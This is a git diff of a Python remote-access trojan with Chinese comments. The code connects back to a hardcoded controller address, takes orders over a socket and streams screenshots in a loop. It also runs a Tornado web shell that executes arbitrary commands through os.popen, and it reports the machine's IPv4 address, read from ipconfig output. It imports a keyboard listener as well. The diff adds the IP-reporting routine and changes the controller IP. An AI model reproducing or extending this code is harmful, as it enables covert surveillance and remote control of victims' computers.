@@ -6,6 +6,7 @@ import threading
 import pyautogui
 import time
 import os
+import re
 import struct
 from pynput.keyboard import Listener
 from tornado.web import RequestHandler, Application
@@ -24,7 +25,7 @@ class socket_connect_sreecnShot:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             # 连接到主机
-            s.connect(("192.168.2.105", 14445))
+            s.connect(("172.16.11.19", 14445))
             return s
 
         except socket.error as e:
@@ -105,9 +106,10 @@ def recvOrder():
     while 1:
         data = con.recv(1024)
         if data:
+            print('haha')
             # print(data.decode())
-            con.close()
-            return data.decode()
+            # con.close()
+            return [data.decode(),con]
             # break
         else:
             continue  
@@ -160,9 +162,11 @@ class cmdHandler(RequestHandler):
             #     self.write('切换失败')    
                 
         if cmd:
+            self.write(cmd)
+            # self.write('jaj')
             res = os.popen(cmd,'r')
             res = res.read()
-            self.write(res)    
+            self.write(res)  
             
        
 
@@ -199,6 +203,9 @@ def webShellMain():
     s = sok.socket_console()
     port = s.recv(1024).decode()
     print(port)
+    # hostname = socket.gethostname()
+    ipv4 = get_realip()
+    s.send(ipv4.encode('utf-8'))
     define("port", default=port, help="this is port")
     parse_command_line()
     server = HTTPServer(app())
@@ -206,16 +213,38 @@ def webShellMain():
     server.start()
     IOLoop.current().start()
 
+# 获取本机ipv4
+def get_realip():
+    filename = "ip.swbd"
+    # open(filename, "w").write("")
+    os.system("ipconfig > {}".format(filename))
+    text = open("{}".format(filename)).read()
+    # print(text)
+    try:
+        ipv4 = re.findall(r'以太网适配器 以太网:(.*?)默认网关', text, re.S)[0]
+        ipv4 = re.findall(r'IPv4 地址 . . . . . . . . . . . . :(.*?)子网掩码', ipv4, re.S)[0].replace(" ", "")
+        # print(ipv4)
+    except:
+        ipv4 = re.findall(r'无线局域网适配器 WLAN:(.*?)默认网关', text, re.S)[0]
+        ipv4 = re.findall(r'IPv4 地址 . . . . . . . . . . . . :(.*?)子网掩码', ipv4, re.S)[0].replace(" ", "")
+        # print(ipv4)
+    os.remove(filename)
+    return ipv4
 
 if __name__ == "__main__":
-    order = recvOrder()
+    recvA = recvOrder()
+    order = recvA[0]
+    con = recvA[1]
+    print(order)
     if str(order) == str(1):
         screenShot = socket_connect_sreecnShot()
         # 获取连接后socket对象
-        print(screenShot.socket_console())
+        # print(screenShot.socket_console())
         s=screenShot.socket_console()
         # 截屏操作
         while 1:
+            print('=========================')
+            # s.send('haha'.encode('utf-8'))
             screenShot.scrennShot()
             filepath = screenShot.sendDataPack(s)
             screenShot.openSreenImg(s, filepath)
